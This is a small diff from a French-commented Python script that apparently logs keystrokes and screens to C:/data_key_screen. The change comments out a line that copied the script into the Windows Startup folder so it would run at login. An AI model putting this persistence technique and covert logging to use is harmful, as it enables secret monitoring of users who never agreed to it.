@@ -11,8 +11,8 @@ username = os.getlogin()
 nomFichierActuelle = os.path.basename(__file__)
 
 # **** AU DEMARRAGE
-copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")
-
+#copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")
+#flm juste creer un raccourci et colle le
 # **** EMPLACEMENT SAUVEGARDE
 nomEmplacementSauvegarde = "C:/data_key_screen"
 if not os.path.exists(nomEmplacementSauvegarde):
